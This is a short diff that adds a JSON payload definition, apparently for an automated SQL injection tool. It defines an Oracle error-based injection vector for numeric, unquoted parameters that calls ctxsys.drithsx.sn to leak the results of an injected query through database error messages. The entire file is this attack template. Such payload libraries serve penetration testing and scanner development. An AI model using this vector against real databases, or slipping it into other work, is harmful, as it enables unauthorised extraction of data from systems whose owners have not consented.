@@ -1,0 +1,12 @@
+{
+ "dbms": "oracle",
+ "technique": "error",
+ "boundary": {
+  "prefix": "",
+  "suffix": "",
+  "type": "numeric",
+  "desc": "numeric unquoted"
+ },
+ "vector": "{B} AND 1=ctxsys.drithsx.sn(1,({Q}))",
+ "comment": "oracle error via numeric unquoted"
+}
